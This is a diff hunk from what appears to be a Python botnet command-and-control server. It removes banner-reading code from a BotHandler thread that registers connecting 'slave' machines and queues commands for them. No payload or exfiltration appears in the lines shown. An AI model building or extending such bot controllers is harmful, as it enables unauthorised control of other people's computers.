@@ -75,15 +75,6 @@ class BotHandler(threading.Thread):
     def run(self):
         BotName = threading.current_thread().getName()
         print("\n[*] Slave {}:{} connected with Thread-ID: {}".format(self.ip,self.port,BotName))
-        try:
-            #self.client.send("Hello!".encode('utf-8'))
-            self.client.settimeout(5)
-            banner = ''
-            while True:
-                banner += self.client.recv(1024).decode('utf-8')
-            print("\n[+] Banner data in: {}".format(banner))
-        except Exception as ex:
-            print("\n[-] No banner data. Exception {}".format(ex))
         self.ClientList[BotName] = self.client_address
         while True:
                 RecvBotCmd = self.q.get()
